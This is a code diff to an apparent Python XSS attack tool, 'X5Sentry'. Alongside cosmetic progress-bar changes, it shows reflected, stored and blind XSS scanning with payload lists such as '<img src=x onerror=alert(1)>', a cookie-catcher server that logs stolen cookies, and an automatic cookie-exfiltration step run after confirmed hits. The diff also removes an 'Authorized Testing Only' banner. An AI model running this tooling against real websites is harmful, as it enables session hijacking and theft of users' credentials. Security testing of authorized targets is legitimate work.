@@ -32,6 +32,7 @@
 """
 
 import argparse
+import math
 import subprocess
 import http.server
 import json
@@ -62,7 +63,7 @@ from rich.panel import Panel
 from rich.text import Text
 from rich.align import Align
 from rich.table import Table
-from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn
+from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn, MofNCompleteColumn, ProgressColumn
 from rich.rule import Rule
 from rich import box
 from rich.live import Live
@@ -142,6 +143,69 @@ def divider(char="-", w=60, col=None):
 
 
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# BRAILLE-WAVE PROGRESS BAR  &  CASE-WAVE TEXT ANIMATION
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Braille block characters — each encodes a different dot-fill density,
+# creating a smooth left-to-right flowing wave when cycled.
+_BRAILLE_WAVE = [
+    "⠁", "⠃", "⠇", "⡇", "⣇", "⣧", "⣷", "⣿",
+    "⣾", "⣶", "⣦", "⣄", "⡄", "⠄", "⠀", "⠀",
+]
+
+class BrailleWaveColumn(ProgressColumn):
+    """Rich ProgressColumn — Braille-dot wave for indeterminate,
+    Braille-fill ramp for determinate tasks."""
+
+    def render(self, task) -> Text:
+        t      = time.time()
+        width  = 26
+        n      = len(_BRAILLE_WAVE)
+
+        if task.total is None:
+            # Indeterminate: flowing Braille wave
+            chars = ""
+            for i in range(width):
+                idx = int((i * 2 - t * 12)) % n
+                if idx < 0: idx += n
+                chars += _BRAILLE_WAVE[idx]
+            return Text(chars, style="bold red")
+
+        # Determinate: filled Braille ramp + empty space
+        pct    = task.completed / task.total
+        filled = int(pct * width)
+        remain = width - filled
+        bar    = "⣿" * filled + "⠀" * remain
+        return Text(bar, style="bold red")
+
+
+def case_wave(text: str, frame: float = None) -> Text:
+    """Returns a rich Text object with a sinusoidal Case-Wave effect.
+    Characters at the wave peak are BOLD CYAN UPPER, descending to dim lower."""
+    if frame is None:
+        frame = time.time()
+
+    result = Text()
+    for i, ch in enumerate(text):
+        if ch == " ":
+            result.append(" ")
+            continue
+        # Wave value: -1.0 → +1.0
+        val = math.sin(i * 0.45 + frame * 3.5)
+        if val > 0.6:
+            result.append(ch.upper(), style="bold red")
+        elif val > 0.2:
+            result.append(ch.upper(), style="red")
+        elif val > -0.2:
+            result.append(ch,         style="white")
+        elif val > -0.6:
+            result.append(ch.lower(), style="dim red")
+        else:
+            result.append(ch.lower(), style="dim")
+    return result
+
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # HUD STATE & LIVE INTERFACE
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class HUDState:
@@ -195,17 +259,24 @@ class CyberTacticalHUD:
     def get_renderable(self):
         layout = self.make_layout()
 
-        # Left: Stats panel
         eps_total = self.state.endpoints_total or 1
         eps_done  = self.state.endpoints_tested
         pct       = int((eps_done / eps_total) * 100)
-        bar_fill  = int((eps_done / eps_total) * 18)
-        bar       = "█" * bar_fill + "░" * (18 - bar_fill)
+        t         = time.time()
 
+        # Braille-Wave mini-bar for the stats panel
+        bw_width  = 18
+        bw_filled = int((eps_done / eps_total) * bw_width)
+        bw_bar    = "⣿" * bw_filled + "⠀" * (bw_width - bw_filled)
+
+        # Case-Wave on the current action status
+        status_wave = case_wave(self.state.current_action, frame=t)
+
+        # Left: Stats panel
         stats_table = Table(show_header=False, box=None, padding=(0, 1))
         stats_table.add_row("[bold yellow]Target[/]",   f"[dim]{self.state.target[:35]}[/]")
-        stats_table.add_row("[bold yellow]Status[/]",   f"[bold cyan]{self.state.current_action}[/]")
-        stats_table.add_row("[bold yellow]Progress[/]", f"[cyan]{bar}[/] [bold]{pct}%[/]")
+        stats_table.add_row("[bold yellow]Status[/]",   status_wave)
+        stats_table.add_row("[bold yellow]Progress[/]", Text(f"{bw_bar} {pct}%", style="bold red"))
         stats_table.add_row("[bold yellow]Endpoints[/]",f"{eps_done} / {eps_total}")
         stats_table.add_row("[bold yellow]Requests[/]", f"{self.state.requests_sent}")
         stats_table.add_row("[bold red]VULN HITS[/]",   f"[bold red]{self.state.findings_count}[/]")
@@ -237,13 +308,20 @@ class CyberTacticalHUD:
             f_table.add_row("[dim]--[/]", "[dim]Scanning...[/]", "[dim]--[/]", "[dim]--[/]", "[dim]Awaiting results[/]")
         layout["right"].update(Panel(f_table, border_style="red"))
 
-        # Footer: progress bar
-        prog     = eps_done / eps_total
-        bar_w    = 70
-        filled   = int(prog * bar_w)
-        prog_bar = "█" * filled + "░" * (bar_w - filled)
+        # Footer: Braille-Wave full-width progress bar
+        prog      = eps_done / eps_total
+        fw        = 60
+        filled    = int(prog * fw)
+        prog_bar  = "⣿" * filled + "⠀" * (fw - filled)
+        # Animate trailing edge with a wave caret
+        n         = len(_BRAILLE_WAVE)
+        wave_idx  = int(t * 12) % n
+        wave_char = _BRAILLE_WAVE[wave_idx] if filled < fw else "⣿"
+        if filled < fw:
+            prog_bar = "⣿" * filled + wave_char + "⠀" * max(0, fw - filled - 1)
+        footer_text = Text(f"{prog_bar}  {pct}%", style="bold red")
         layout["footer"].update(Panel(
-            Align.center(Text(f"{prog_bar}  {pct}%", style="bold cyan")),
+            Align.center(footer_text),
             border_style="dim", title="[dim]AUDIT PROGRESS[/dim]"
         ))
 
@@ -261,23 +339,12 @@ def print_banner():
    \  /  \___ \___ \|  _| |  \| | | | | |_) | \ V / 
    /  \   ___) |__) | |___| |\  | | | |  _ <   | |  
   /_/\_\ |____/____/|_____|_| \_| |_| |_| \_\  |_|  
-    """
-    
-    # Minimalist sleek header
-    title_text = Text.from_ansi(art)
-    title_text.stylize("bold red")
-    
-    console.print(Rule(style="bold red", title="[bold white]\u26a1 XSS AUDIT SYSTEM[/]"))
-    console.print(Align.center(title_text))
-    
-    meta_table = Table(box=None, show_header=False, padding=(0, 2))
-    meta_table.add_row(Text("Tool", style="bold yellow"), "X5Sentry \u2014 Professional XSS Detection Engine")
-    meta_table.add_row(Text("Engine", style="bold yellow"), "Input \u2192 Audit \u2192 Verify \u2192 Exfil")
-    meta_table.add_row(Text("Safety", style="bold yellow"), "4-stage FP elimination \xb7 Authorized Testing")
-    
-    console.print(Align.center(meta_table))
-    console.print(Rule(style="bold yellow", title="[bold red]\u26a0 Authorized Testing Only[/]"))
-    console.print()
+"""
+    console.print("\n")
+    console.print(Align.center(Text(art, style="bold white")))
+    console.print(Align.center(Text("\u2014  A u t o n o m o u s  X S S  H u n t e r  \u2014", style="dim")))
+    console.print("\n")
+
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # COOKIE CATCH SERVER
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -313,7 +380,7 @@ class CookieCatcher:
                         CookieCatcher.caught.append(entry)
                     tprint(f"\n  {ck_lbl('COOKIE RECEIVED!')}")
                     tprint(f"  {color('  From IP :', C.BYELLOW)} {color(src_ip, C.BWHITE)}")
-                    tprint(f"  {color('  Cookie  :', C.BYELLOW)} {color(cookie, C.fg(214), C.BOLD)}")
+                    tprint(f"  {color('  Cookie  :', C.BYELLOW)} {color(cookie, C.fg(214))}")
                     tprint(f"  {color('  UA      :', C.DIM)} {color(ua[:80], C.DIM)}\n")
                 self.send_response(200)
                 self.send_header("Content-Type", "text/plain")
@@ -1113,7 +1180,6 @@ class PlaywrightValidator:
             return False, None, ["playwright-not-installed"]
 
         confirmed, events, screenshot_path = False, [], None
-        # Merge all parameters for the request
         full_params = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}
 
         try:
@@ -1121,46 +1187,52 @@ class PlaywrightValidator:
                 browser = p.chromium.launch(headless=self.headless)
                 context = browser.new_context(ignore_https_errors=True)
                 page = context.new_page()
+                _dialog_fired = threading.Event()
 
-                # Robust execution listeners
-                def handle_signal(sig_type, msg):
-                    nonlocal confirmed
+                def handle_dialog(d):
+                    nonlocal confirmed, screenshot_path
+                    msg = f"{d.type}:{d.message}"
                     m_lower = msg.lower()
                     if any(x in m_lower for x in ["alert", "confirm", "prompt", "1", "xs5"]):
                         confirmed = True
-                        events.append(f"{sig_type}:CONFIRMED:{msg[:50]}")
+                        events.append(f"dialog:CONFIRMED:{msg[:50]}")
+                        # Screenshot BEFORE dismiss so popup is visible in evidence
+                        try:
+                            ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            safe = "".join(c for c in param if c.isalnum())
+                            fname = f"xss_{safe}_{ts}.png"
+                            screenshot_path = os.path.join(self.evidence_dir, fname)
+                            page.screenshot(path=screenshot_path)
+                        except Exception as se:
+                            events.append(f"ss-err:{str(se)[:40]}")
                     else:
-                        events.append(f"{sig_type}:LOG:{msg[:30]}")
+                        events.append(f"dialog:LOG:{msg[:30]}")
+                    try: d.dismiss()
+                    except Exception: pass
+                    _dialog_fired.set()
 
-                page.on("dialog", lambda d: (handle_signal("dialog", f"{d.type}:{d.message}"), d.dismiss()))
-                page.on("console", lambda m: handle_signal("console", f"{m.type}:{m.text}"))
+                page.on("dialog", handle_dialog)
+                page.on("console", lambda m: events.append(f"console:{m.type}:{m.text[:40]}"))
                 page.on("pageerror", lambda e: events.append(f"js-err:{str(e)[:50]}"))
 
                 try:
                     if method == "GET":
                         target = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(full_params)
-                        page.goto(target, timeout=15000, wait_until="networkidle")
+                        page.goto(target, timeout=12000, wait_until="domcontentloaded")
                     else:
-                        # POST Support: Inject a self-submitting form into a blank page
                         page.goto("about:blank")
                         form_html = f"""
                         <form id="pk" method="POST" action="{url}">
-                            {" ".join([f'<input type="hidden" name="{k}" value="{str(v).replace('"', '&quot;')}">' for k,v in full_params.items()])}
+                            {" ".join([f'<input type="hidden" name="{k}" value="{str(v).replace(chr(34), "&quot;")}">' for k,v in full_params.items()])}
                         </form>
                         <script>document.getElementById('pk').submit();</script>
                         """
                         page.set_content(form_html)
-                    
-                    page.wait_for_timeout(3000) # Increased wait for async execution
+                    # Event-driven wait — exits immediately when dialog fires
+                    _dialog_fired.wait(timeout=4.0)
                 except Exception as e:
                     events.append(f"nav-err:{str(e)[:40]}")
 
-                if confirmed:
-                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    fname = f"xss_{"".join(c for c in param if c.isalnum())}_{ts}.png"
-                    screenshot_path = os.path.join(self.evidence_dir, fname)
-                    page.screenshot(path=screenshot_path)
-                    
                 browser.close()
         except Exception as e:
             events.append(f"pw-err:{str(e)[:40]}")
@@ -1251,11 +1323,27 @@ class XSSVerifier:
             return True, f"fragment:{matched[0]}", ctx
         return False, "none", "unknown"
 
+    @staticmethod
+    def _is_json_response(resp):
+        """True when the server returned application/json content."""
+        if not resp: return False
+        hdrs = resp.get("headers", {})
+        ct = hdrs.get("Content-Type", hdrs.get("content-type", "")).lower()
+        return "application/json" in ct or "text/json" in ct
+
     def verify(self, url, method, param, all_params, payload, baseline_body, hidden=None):
         fill = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}
         resp = self.client.post(url, fill) if method == "POST" else self.client.get(url, fill)
         if not resp: return False, [], None
         body = resp["body"]
+
+        # JSON API endpoint: skip HTML verification, flag as API reflection for SPA analysis
+        if self._is_json_response(resp):
+            if payload in body:
+                return True, ["reflect:exact:json_api", "api:unescaped_in_json"], resp
+            if payload.lower() in body.lower():
+                return True, ["reflect:case:json_api", "api:unescaped_in_json"], resp
+            return False, [], resp
         
         reflected, how, ctx = self._reflected(body, payload)
         if not reflected: return False, [], resp
@@ -1358,9 +1446,8 @@ class XSSTester:
         except Exception: return ""
 
     def _print_hit(self, url, method, param, payload, sigs,
-                   sc, burl, ck_pocs, score, stolen=None, pw_ev=None):
+                   sc, burl, ck_pocs, score, stolen=None, pw_ev=None, screenshot=None):
         """Clean, high-visibility finding report."""
-        # Sys.stdout.write is removed as Rich handled clearing lines
         tprint(f"\n[bold white on red] FOUND [/] [bold white]{url}[/]")
         
         info_line = (f"  [dim]param:[/] [bold orange3]{param}[/] "
@@ -1372,10 +1459,15 @@ class XSSTester:
         
         if sigs:
             tprint(f"  [dim]signals:[/] [bold green]{', '.join(sigs[:5])}[/]")
-        
-        if pw_ev:
+
+        if pw_ev and pw_ev != ["skipped:json_api_endpoint"]:
             tprint(f"  [dim]browser:[/] [bold cyan]CONFIRMED[/] [dim]via Playwright[/]")
             for ev in pw_ev: tprint(f"    [dim]->[/] [dim]{ev}[/]")
+        elif pw_ev == ["skipped:json_api_endpoint"]:
+            tprint(f"  [dim]browser:[/] [bold yellow]SKIPPED[/] [dim]— JSON API; SPA frontend may render payload[/]")
+
+        if screenshot:
+            tprint(f"  [dim]evidence:[/] [bold green]{screenshot}[/]")
         
         if stolen:
             tprint(f"  [dim]cookie :[/] [bold orange3]{stolen}[/]")
@@ -1401,7 +1493,8 @@ class XSSTester:
     def _probe_context(self, url, method, param, all_params, hidden):
         """
         Send a unique canary value to detect where the param is reflected.
-        Returns: "html" | "attr" | "js" | "url" | "unknown" | "none"
+        Returns: "html" | "attr" | "js" | "url_attr" | "json_api" | "unknown" | "none"
+        json_api = response is application/json (SPA data endpoint — browser won't execute JS directly)
         """
         canary = "XS5CTX" + "".join(random.choices(string.ascii_lowercase, k=6))
         fill   = {**{p: "test" for p in all_params if p != param},
@@ -1409,6 +1502,8 @@ class XSSTester:
         try:
             resp = (self.client.post(url, fill) if method == "POST"
                     else self.client.get(url, fill))
+            if XSSVerifier._is_json_response(resp):
+                return "json_api"
             body = resp.get("body", "")
             if canary not in body: return "none"
             return XSSVerifier._detect_context(body, canary)
@@ -1419,17 +1514,17 @@ class XSSTester:
     def _prioritise_payloads(payloads, ctx, tier_cap):
         """
         Re-order payload list to put context-appropriate payloads first.
-        Payloads for the detected context fire first --- faster confirmation.
-        Falls back to all payloads after context-specific ones.
+        json_api: prefer plain html/poly payloads — SPA framework renders the value into DOM.
         """
-        # Context --- best payload types to try first
         ctx_types = {
-            "html":    ["html", "poly", "mxss"],
-            "attr":    ["attr", "html", "poly"],
-            "js":      ["js",   "poly", "attr"],
-            "url":     ["html", "attr"],
-            "unknown": ["html", "attr", "js", "poly", "mxss"],
-            "none":    ["html", "attr", "js", "poly", "mxss"],
+            "html":     ["html", "poly", "mxss"],
+            "attr":     ["attr", "html", "poly"],
+            "js":       ["js",   "poly", "attr"],
+            "url":      ["html", "attr"],
+            "url_attr": ["attr", "html", "poly"],
+            "json_api": ["html", "poly", "attr", "mxss"],
+            "unknown":  ["html", "attr", "js", "poly", "mxss"],
+            "none":     ["html", "attr", "js", "poly", "mxss"],
         }
         priority = ctx_types.get(ctx, ctx_types["unknown"])
         tier_ok  = [p for p in payloads
@@ -1439,24 +1534,22 @@ class XSSTester:
         return first + rest
 
     def test_endpoint(self, n, tot, url, method, params, hidden, progress_bar=None, task_id=None):
-        """
-        HELLHOUND-class endpoint test loop.
-        FIXED: Robust signal passing to Scorer and accurate context-based prioritizing.
-        """
         pnames = list(params.keys()); baseline = self._baseline(url, method, params, hidden)
         if progress_bar and task_id:
             progress_bar.update(task_id, description=f"[cyan]Testing {url[:40]}...")
 
+        exfil_targets = []  # Collect confirmed params for cookie exfil at end
+
         for param in pnames:
             param_confirmed = False
-            self.analyzer.analyze(url, method, param, pnames, hidden) # Pre-analysis
-            ctx = self._probe_context(url, method, param, pnames, hidden) # Context probe
-            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier) # Re-order list
+            self.analyzer.analyze(url, method, param, pnames, hidden)
+            ctx     = self._probe_context(url, method, param, pnames, hidden)
+            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier)
 
             for pd in ordered:
                 if param_confirmed: break
                 payload = pd["pl"]
-                
+
                 if self.hud:
                     self.hud.update(requests_sent=self.hud.requests_sent + 1)
                     self.hud.update(log=f"[dim]Audit:[/] {method} {url[:40]} [{param}]")
@@ -1465,23 +1558,28 @@ class XSSTester:
                 if self.delay: time.sleep(self.delay)
                 if not confirmed: continue
 
-                # Deep signal extraction for the Scorer
+                # First confirmed payload — stop testing this param immediately
                 r_sig = [s for s in sigs if s.startswith("reflect:")][0]
                 _, how, det_ctx = r_sig.split(":", 2)
+                param_confirmed = True
+                sc = resp["status"] if resp else 0
 
-                param_confirmed = True; sc = resp["status"] if resp else 0
-                burl = PoC.browser(url, method, param, payload, pnames, hidden)
+                # JSON API endpoint: skip Playwright (visiting raw JSON won't execute JS)
+                is_api = det_ctx == "json_api"
+                if is_api:
+                    pw_confirmed, screenshot, pw_ev = False, None, ["skipped:json_api_endpoint"]
+                    score    = 65  # Potential — SPA frontend may render it
+                    xss_type = "api_reflected"
+                else:
+                    pw_confirmed, screenshot, pw_ev = self.pw.validate(url, method, param, payload, pnames, hidden)
+                    score    = Scorer.calculate(sigs, how, det_ctx, confirmed, pw_confirmed)
+                    xss_type = "reflected_" + det_ctx if det_ctx not in ("none","unknown") else "reflected"
+                    if "mxss" in pd.get("type",""): xss_type = "mutation"
+                    elif "uxss" in pd.get("type",""): xss_type = "universal"
+
+                burl    = PoC.browser(url, method, param, payload, pnames, hidden)
                 ck_pocs = PoC.cookie_pocs(url, method, param, pnames, self.catcher, hidden)
-                stolen = self._auto_exfil(ck_pocs, self._catcher_obj)
-
-                # Headless browser confirmation (Playwright)
-                pw_confirmed, screenshot, pw_ev = self.pw.validate(url, method, param, payload, pnames, hidden)
-                score = Scorer.calculate(sigs, how, det_ctx, confirmed, pw_confirmed)
-
-                # Classification
-                xss_type = "reflected_" + det_ctx if det_ctx not in ("none","unknown") else "reflected"
-                if "mxss" in pd.get("type",""): xss_type = "mutation"
-                elif "uxss" in pd.get("type",""): xss_type = "universal"
+                exfil_targets.extend(ck_pocs)  # Queue for batch exfil after all params
 
                 f_entry = {
                     "url": url, "method": method, "param": param, "payload": payload,
@@ -1492,7 +1590,15 @@ class XSSTester:
                 }
                 with self._lock: self.findings.append(f_entry)
                 if self.hud: self.hud.add_finding(f_entry)
-                self._print_hit(url, method, param, payload, sigs, sc, burl, ck_pocs, score, stolen, pw_ev)
+                self._print_hit(url, method, param, payload, sigs, sc, burl, ck_pocs, score, None, pw_ev, screenshot)
+
+        # Cookie exfil — once per endpoint after ALL params tested, single attempt
+        if exfil_targets and self._catcher_obj:
+            stolen = self._auto_exfil(exfil_targets, self._catcher_obj)
+            if stolen:
+                tprint(f"  {ck_lbl(f'Cookie exfil confirmed: {stolen[:80]}')}")
+            else:
+                tprint(f"  {warn('Cookie exfil: payloads fired but no callback — victim interaction may be needed')}")
 
     def run(self, endpoints, catcher_obj=None, threads=8):
         self._catcher_obj = catcher_obj
@@ -1503,9 +1609,8 @@ class XSSTester:
         console.print()
 
         with Progress(
-            SpinnerColumn(),
-            TextColumn("[bold magenta]Phase 4:[/] [bold cyan]{task.description}"),
-            BarColumn(complete_style="magenta"),
+            BrailleWaveColumn(),
+            TextColumn("[bold red]Phase 4:[/] [bold white]{task.description}"),
             MofNCompleteColumn(),
             TimeRemainingColumn(),
             console=console,
@@ -1800,26 +1905,27 @@ UXSS_PAYLOADS = [
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class StoredXSSScanner:
     """
-    Pipeline:
-      1. Identify writable endpoints (POST/PUT, form inputs, JSON APIs)
-      2. Inject stored XSS payload with a unique token
-      3. Visit retrieval URLs (comments page, profile, dashboard, activity feed---)
-      4. Check if the payload token appears unescaped
-      5. If found --- confirmed stored XSS
+    BLOODHOUND Taint-Analysis Engine — 3-phase autonomous stored XSS detection.
 
-    Retrieval URL heuristics:
-      - Same-domain pages crawled during phase 1
-      - Common display paths: /comments, /profile, /dashboard, /feed, /activity,
-        /admin, /messages, /inbox, /posts, /search, /review, /history
+    Phase 1 — Marker injection: injects a harmless unique marker into every param
+               via correct method (GET/POST). Crawls spider-discovered HTML pages
+               to map data flows without hard-coded paths.
+    Phase 2 — Targeted attack: real XSS payloads fired only on confirmed flows,
+               diffed against baseline so false fragment matches are impossible.
+    Phase 3 — Playwright confirmation + screenshot as evidence.
     """
-    _RETRIEVAL_PATHS = [
-        "/", "/comments", "/comment", "/profile", "/dashboard",
-        "/feed", "/activity", "/admin", "/messages", "/inbox",
-        "/posts", "/post", "/search", "/review", "/history",
-        "/forum", "/board", "/thread", "/ticket", "/issue",
-        "/blog", "/news", "/article", "/entries", "/log",
-        "/user", "/users", "/account", "/settings", "/notifications",
-        "/guestbook", "/report", "/results", "/output", "/preview",
+    _STORED_PAYLOADS = [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+        '"><script>alert(1)</script>',
+        '<svg onload=alert(1)>',
+        "'><img src=x onerror=alert(1)>",
+        '<details open ontoggle=alert(1)>',
+        '<iframe srcdoc="<script>alert(1)</script>">',
+    ]
+    _XSS_FRAGS = [
+        "<script>alert", "onerror=alert(1)", "onload=alert(1)",
+        "ontoggle=alert(1)", 'srcdoc="<script>alert',
     ]
 
     def __init__(self, client, visited_urls=None):
@@ -1827,62 +1933,176 @@ class StoredXSSScanner:
         self.visited_urls = list(visited_urls or [])
         self.findings     = []
         self._lock        = threading.Lock()
+        self._pw          = PlaywrightValidator(headless=True)
 
-    def _retrieval_urls(self, base):
-        """Build list of URLs to check after injection."""
-        parsed = urllib.parse.urlparse(base)
-        root   = f"{parsed.scheme}://{parsed.netloc}"
-        urls   = set(self.visited_urls)
-        for path in self._RETRIEVAL_PATHS:
-            urls.add(root + path)
-        return list(urls)
+    def _html_candidates(self, base_url):
+        """
+        Autonomously discover display pages from spider crawl data.
+        Probes each visited URL and keeps only those that return text/html.
+        No hard-coded paths — the spider already mapped the app.
+        """
+        parsed = urllib.parse.urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        same_origin = [u for u in self.visited_urls
+                       if u.startswith(origin) and not u.endswith(
+                           (".js", ".css", ".png", ".jpg", ".svg", ".ico", ".woff"))]
+        html_pages = []
+        checked = set()
+        for url in same_origin:
+            if url in checked: continue
+            checked.add(url)
+            try:
+                resp = self.client.get(url)
+                ct   = resp.get("headers", {}).get(
+                    "Content-Type", resp.get("headers", {}).get("content-type", ""))
+                if "text/html" in ct.lower():
+                    html_pages.append(url)
+            except Exception:
+                continue
+        return html_pages if html_pages else [origin + "/"]
 
-    def _stored_token(self):
-        return "XS5S" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    def _marker(self):
+        uid = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        return f"xs5bh{uid}"
 
-    def scan(self, endpoints, base_url):
-        section("STORED XSS --- INJECT & RETRIEVE")
-        retrieval = self._retrieval_urls(base_url)
-        console.log(info(f"{len(endpoints)} writable endpoints -- {len(retrieval)} retrieval URLs"))
+    def _inject(self, ep, param, value):
+        params = {**ep["params"], param: value}
+        return (self.client.post(ep["url"], params) if ep["method"] == "POST"
+                else self.client.get(ep["url"], params))
 
-        with Progress(
-            SpinnerColumn(),
-            TextColumn("[bold orange3]Stored XSS:[/] {task.description}"),
-            BarColumn(complete_style="orange3"),
-            MofNCompleteColumn(),
-            console=console,
-            transient=True
-        ) as progress_bar:
-            total_tasks = sum(1 for ep in endpoints if ep["method"] in ("POST","PUT")) * len(retrieval)
-            task = progress_bar.add_task("Injecting & Verifying...", total=total_tasks)
+    def _fetch_bodies(self, urls):
+        result = {}
+        for url in urls:
+            try: result[url] = self.client.get(url).get("body", "")
+            except Exception: result[url] = ""
+        return result
 
-            # Use simple reflected payloads wrapped with unique token for stored check
-            stored_pls = [
-                '<script>alert("XS5STORED")</script>',
-                '<img src=x onerror=alert("XS5STORED")>',
-                '"><script>alert("XS5STORED")</script>',
-            ]
+    def _pw_confirm_stored(self, display_url):
+        if not PLAYWRIGHT_INSTALLED:
+            return False, None
+        confirmed, screenshot_path = False, None
+        try:
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True)
+                ctx     = browser.new_context(ignore_https_errors=True)
+                page    = ctx.new_page()
+                _fired  = threading.Event()
 
-            for ep in endpoints:
-                if ep["method"] not in ("POST","PUT"): continue
-                url, params = ep["url"], ep["params"]
-                for param in params:
-                    token = self._stored_token()
-                    for pl_tmpl in stored_pls:
-                        pl = pl_tmpl.replace("XS5STORED", token)
+                def _dialog(d):
+                    nonlocal confirmed, screenshot_path
+                    confirmed = True
+                    try:
+                        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        fname = f"stored_xss_{ts}.png"
+                        screenshot_path = os.path.join(self._pw.evidence_dir, fname)
+                        page.screenshot(path=screenshot_path)
+                    except Exception: pass
+                    try: d.dismiss()
+                    except Exception: pass
+                    _fired.set()
+
+                page.on("dialog", _dialog)
+                try:
+                    page.goto(display_url, timeout=12000, wait_until="domcontentloaded")
+                    _fired.wait(timeout=5.0)
+                except Exception: pass
+                browser.close()
+        except Exception: pass
+        return confirmed, screenshot_path
+
+    def scan(self, endpoints, base_url, hud_state=None):
+        section("STORED XSS --- BLOODHOUND TAINT ANALYSIS")
+
+        console.print(info("[bold]Discovery:[/] Identifying HTML display pages from crawl data..."))
+        candidates = self._html_candidates(base_url)
+        all_eps    = endpoints if endpoints else []
+        console.print(info(
+            f"{len(all_eps)} endpoints -- {len(candidates)} HTML display pages "
+            f"[dim](autonomously discovered — no hard-coded paths)[/dim]"
+        ))
+
+        if not candidates:
+            console.print(warn("No HTML display pages found in crawl data — skipping stored XSS."))
+            return self.findings
+
+        # Baseline snapshot before any injection
+        console.print(info("[bold]Baseline:[/] Snapshotting display pages..."))
+        baseline_bodies = self._fetch_bodies(candidates)
+
+        # Phase 1: marker injection → data-flow mapping
+        console.print(info("[bold]Phase 1:[/] Injecting taint markers to map data flows..."))
+        data_flows = []
+
+        with Progress(BrailleWaveColumn(),
+                      TextColumn("[bold red]Bloodhound:[/] [bold white]{task.description}"),
+                      MofNCompleteColumn(),
+                      console=console, transient=True) as pb:
+            total = sum(len(ep["params"]) for ep in all_eps) * len(candidates)
+            task  = pb.add_task("Mapping data flows...", total=max(total, 1))
+
+            for ep in all_eps:
+                for param in ep["params"]:
+                    marker = self._marker()
+                    try: self._inject(ep, param, marker)
+                    except Exception:
+                        pb.update(task, advance=len(candidates)); continue
+                    for durl in candidates:
+                        pb.update(task, description=f"Hunting {durl[-35:]}...", advance=1)
                         try:
-                            self.client.post(url, {**params, param: pl})
-                            for rurl in retrieval:
-                                progress_bar.update(task, description=f"Checking {rurl[:30]}...", advance=1)
-                                resp = self.client.get(rurl)
-                                if token in resp.get("body",""):
-                                    if token in resp["body"] and token.replace("<","&lt;") not in resp["body"]:
-                                        finding = {"type":"stored","inject_url":url,"found_at":rurl,"param":param,"payload":pl,"score":95}
-                                        with self._lock: self.findings.append(finding)
-                                        console.log(f"\n[bold white on orange3] STORED [/] [bold white]{url}[/]")
-                                        console.log(f"  [dim]found at:[/] [cyan]{rurl}[/]")
-                                        break
+                            body = self.client.get(durl).get("body", "")
+                            if marker in body and marker not in baseline_bodies.get(durl, ""):
+                                data_flows.append({"ep": ep, "param": param, "display_url": durl})
+                                console.print(ok(f"[bold]DATA FLOW:[/] {ep['method']} {ep['url']} [{param}] → {durl}"))
+                                baseline_bodies[durl] = body
+                                break
                         except Exception: continue
+
+        if not data_flows:
+            console.print(warn("No stored data flows detected — target may sanitize or not persist input."))
+            return self.findings
+
+        # Phase 2: targeted payload attack on confirmed flows
+        console.print(info(f"[bold]Phase 2:[/] Attacking {len(data_flows)} confirmed data flow(s)..."))
+
+        for flow in data_flows:
+            ep, param, display_url = flow["ep"], flow["param"], flow["display_url"]
+            baseline     = baseline_bodies.get(display_url, "")
+            confirmed_pl = None
+
+            for pl in self._STORED_PAYLOADS:
+                try:
+                    self._inject(ep, param, pl)
+                    body      = self.client.get(display_url).get("body", "")
+                    new_frags = [f for f in self._XSS_FRAGS if f in body and f not in baseline]
+                    if new_frags:
+                        confirmed_pl = pl; break
+                except Exception: continue
+
+            if not confirmed_pl:
+                console.print(warn(f"Data flow confirmed ({ep['url']} [{param}] → {display_url}) but payloads sanitized."))
+                continue
+
+            # Phase 3: Playwright confirmation + screenshot
+            pw_confirmed, screenshot = self._pw_confirm_stored(display_url)
+            score = 100 if pw_confirmed else 85
+
+            finding = {
+                "type": "stored", "inject_url": ep["url"], "found_at": display_url,
+                "param": param, "payload": confirmed_pl, "pw_confirmed": pw_confirmed,
+                "screenshot": screenshot, "score": score, "xss_type": "stored", "url": ep["url"],
+            }
+            with self._lock: self.findings.append(finding)
+            if hud_state: hud_state.add_finding(finding)
+
+            console.print(f"\n[bold white on orange3] STORED XSS [/] [bold white]{ep['url']}[/]")
+            console.print(f"  [dim]method  :[/] [bold]{ep['method']}[/]")
+            console.print(f"  [dim]param   :[/] [bold orange3]{param}[/]")
+            console.print(f"  [dim]found at:[/] [cyan]{display_url}[/]")
+            console.print(f"  [dim]payload :[/] [bold red]{confirmed_pl[:80]}[/]")
+            if pw_confirmed: console.print(f"  [dim]browser :[/] [bold cyan]CONFIRMED via Playwright[/]")
+            if screenshot:   console.print(f"  [dim]evidence:[/] [bold green]{screenshot}[/]")
+            console.print(Rule(style="dim"))
+
         return self.findings
 
 
@@ -1916,8 +2136,8 @@ class BlindXSSTester:
         if not self.burl:
             tprint(f"  {warn('No blind XSS server --- skipping (use --blind-port or --blind-url)')}")
             return []
-        tprint(f"  {info(f'Callback: {color(self.burl, C.CYAN, C.BOLD)}')}")
-        tprint(f"  {info(f'Token:    {color(self.token, C.fg(201), C.BOLD)}')}")
+        tprint(f"  {info(f'Callback: [cyan]{self.burl}[/cyan]')}")
+        tprint(f"  {info(f'Token:    [bold magenta]{self.token}[/bold magenta]')}")
